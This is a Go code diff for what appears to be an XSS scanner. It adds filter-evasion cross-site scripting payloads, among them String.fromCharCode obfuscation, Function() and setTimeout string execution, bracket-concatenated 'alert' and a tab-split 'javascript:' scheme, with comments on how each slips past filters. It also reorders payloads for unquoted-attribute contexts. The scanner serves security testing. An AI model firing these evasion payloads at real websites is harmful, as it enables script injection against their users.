@@ -85,7 +85,16 @@ func htmlTextExecLadder() []xssExecPayload {
 		{`<svg onload=print()>`, "svg", "print("},
 		{`<svg onload=(alert)(document.domain)>`, "svg", "(alert)"},
 		{"<svg onload=top[`al`+`ert`](document.domain)>", "svg", "onload"},
+		{`<svg onload=window['al'+'ert'](document.domain)>`, "svg", "onload"},
 		{`<svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>`, "svg", "eval("},
+		// fromCharCode spells "alert" from numeric codes — defeats a filter that
+		// blocks the literal substring "alert(" (case-insensitively, backtick-
+		// and bracket-concat too) but cannot see through character-code math.
+		{`<svg onload=this[String.fromCharCode(97,108,101,114,116)](document.domain)>`, "svg", "onload"},
+		// Function()/setTimeout(string) are eval-like: the actual call site never
+		// contains the word "alert" at all, only inside a string literal argument.
+		{`<svg onload=Function('alert(document.domain)')()>`, "svg", "Function("},
+		{`<svg onload=setTimeout('alert(document.domain)')>`, "svg", "setTimeout("},
 		// ── mutation XSS (mXSS): the browser's own re-parsing behavior — not a
 		// string trick — turns "inert" markup into a live element. <noscript> is
 		// parsed as RAW TEXT only when the scripting flag is enabled (an ordinary
@@ -127,17 +136,28 @@ func buildExecPayloads(a ReflectionAnalysis) []xssExecPayload {
 		ladder := prefixLadder(q + `>`)
 		if a.Context == CtxURL {
 			// href/src sinks also execute a javascript: scheme on click/navigation —
-			// no tag needed. Offered first as the canonical URL-sink vector.
+			// no tag needed. Offered first as the canonical URL-sink vector. The
+			// tab-broken second form parses identically (the URL spec strips ASCII
+			// tab/newline before scheme-checking) while evading a filter that
+			// regex-matches the literal string "javascript:".
 			ladder = append([]xssExecPayload{
 				{`javascript:` + xssAlert, "", "javascript:" + xssAlert},
+				{"jav\tascript:" + xssAlert, "", "javascript:" + xssAlert},
 			}, ladder...)
 		}
 		return ladder
 	case CtxUnquotedAttr:
 		// no quote to break: a space starts a new attribute; also full tag breakout.
-		return append([]xssExecPayload{
-			{` autofocus onfocus=` + xssAlert + ` x=`, "", "onfocus=" + xssAlert},
-		}, prefixLadder(`>`)...)
+		// A tag-NAME-position reflection (AttrName=="") is not reliably focusable
+		// as an invented/unknown element, so autofocus may never fire there; the
+		// close-then-fresh-element ladder works regardless of what "tag" ends up
+		// being formed and goes first when that is the likely case.
+		focusBased := xssExecPayload{` autofocus onfocus=` + xssAlert + ` x=`, "", "onfocus=" + xssAlert}
+		closeThenFresh := prefixLadder(`>`)
+		if a.AttrName == "" {
+			return append(closeThenFresh, focusBased)
+		}
+		return append([]xssExecPayload{focusBased}, closeThenFresh...)
 	case CtxEventHandler:
 		// Nested JavaScript-in-HTML context. Tagless JS breakouts require runtime
 		// proof; an HTML-quote breakout also gets the parsed-element ladder.
